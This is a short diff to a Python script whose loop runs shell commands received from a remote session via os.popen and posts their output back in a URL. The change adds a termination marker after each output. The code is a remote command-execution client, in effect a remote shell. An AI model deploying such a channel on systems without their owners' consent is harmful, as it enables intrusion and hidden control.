@@ -166,4 +166,5 @@ while(True == True):
                     doPrint("("+response[0]['session_id']+") >> "+response[0]['input'].replace(';quote;', '"'))
                     output = os.popen(response[0]['input'].replace(';quote;', '"').replace(';and;', '&')).read()
                     download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;'))
+                    download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output=000-terminate-000")
 terminate()
